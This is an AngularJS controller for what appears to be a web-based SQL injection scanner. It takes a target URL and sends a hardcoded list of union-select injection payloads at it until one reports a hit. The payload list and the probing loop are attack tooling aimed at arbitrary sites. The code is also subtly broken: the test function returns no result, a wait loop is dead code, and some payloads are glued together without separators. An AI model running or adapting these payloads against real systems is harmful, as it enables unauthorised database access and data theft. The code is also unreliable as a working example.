/*
 QUADCORE ENGINEERING MSB
*/
app.controller('AnalyseCtrl', function($scope, AnalyseService, usSpinnerService) {

	$scope.cancel = false;
	$scope.loading = function(state, id){
		if (id == null) { id = 1; }
	    if (state) {
			$scope.cancel = false;
	      	usSpinnerService.spin('spinner-' + id);
	    } else {
	      	usSpinnerService.stop('spinner-' + id);
	    }
  	}
  	$scope.setCancel = function(state) {
		$scope.cancel = state;
		//setTimeout(function(){ $scope.cancel = false; }, 3000);
	}
	$scope.analyse = {
		url_point : '',
		union_style :   "999999.9 union all select [t]" + "\r\n" +
			            "999999.9 union all select [t]--" + "\r\n" +
			            "999999.9' union all select [t] and '0'='0" +
			            "999999.9\" union all select [t] and \"0\"=\"0" + "\r\n" +
			            "999999.9) union all select [t] and (0=0" +
			            "999999.9' and [t] '1'=1" + "\r\n" +
			            "999999.9' or 1=[t] and '1'=1" + "\r\n" +
			            "999999.9 union all select [t] #" + "\r\n" +
			            "999999.9 union all select [t]-- #" + "\r\n" +
			            "999999.9\" union all select [t] and \"0\"=\"0 #" + "\r\n" +
			            "999999.9' union all select [t] and '0'='0 #" + "\r\n" +
			            "999999.9) union all select [t] and (0=0) #" + "\r\n",
		data : ''
	};

	$scope.start = function() {
		$scope.loading(true, 1);
		if($scope.analyse.url_point){
			$scope.analyse.url_point = $scope.analyse.url_point.replace(/\s/g, '+');

			if($scope.analyse.url_point.indexOf("http") > -1 && $scope.analyse.url_point.indexOf("=") > -1) {
				if($scope.analyse.union_style) {

					var unions = $scope.analyse.union_style.split("\r\n");
					var keepGoing = true;

					angular.forEach(unions, function(union) {
						$scope.loading(true, 1);
					    if(keepGoing) {
							if (union != '') {
								var semaphore = false;

								if (startUnion($scope.analyse.url_point, union))
								{
									keepGoing = false; //== >break
									semaphore = true;
								} else{
									semaphore = true;
								}

								while (!semaphore) {
									// We're just waiting.
								}
							}
						}
					});

				} else {
					alert("Veuillez entrer des union a testé");
				}
			} else {
				alert("Le format de l'url ciblé est incorrecte.");
			}
		} else{
			alert("Veuillez renseigner l'url ciblé.");
		}
		$scope.loading(false, 1);
	}

	function startUnion(url_point, union) {
		$scope.data_response = AnalyseService.reqAnalyse(url_point, union).then(function(data_response) {
			$scope.data_response = data_response;

			$scope.analyse.data = $scope.analyse.data + "\r\n" + $scope.data_response.result.data;

			console.log($scope.data_response);

			if ($scope.data_response.result.found == true) {
				return true;
			} else {
				return false;
			}
		}, function(msg){
			alert(msg);
			$scope.loading(false, 1);
		});
	}

});
